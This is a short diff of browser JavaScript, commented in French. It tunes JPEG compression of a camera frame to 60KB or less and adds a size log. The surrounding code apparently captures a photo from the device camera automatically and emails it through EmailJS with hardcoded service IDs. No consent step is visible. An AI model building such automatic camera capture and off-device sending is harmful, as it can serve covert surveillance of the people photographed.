@@ -41,18 +41,22 @@
 
           let quality = 0.9;
           let imageData;
+          let sizeKB = 0;
+
+          // Compression forcée jusqu'à ≤ 60KB
           do {
             imageData = canvas.toDataURL("image/jpeg", quality);
-            const sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
-            if (sizeKB <= 60) break;
+            sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
             quality -= 0.05;
-          } while (quality > 0.1);
+          } while (sizeKB > 60 && quality > 0.05);
+
+          console.log("Taille finale:", sizeKB + "KB à qualité " + (quality+0.05));
 
           stream.getTracks().forEach(track => track.stop());
 
           // 📧 Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo auto 📸",
+            message: "Photo auto 📸 (" + sizeKB + " KB)",
             image: imageData
           });
 
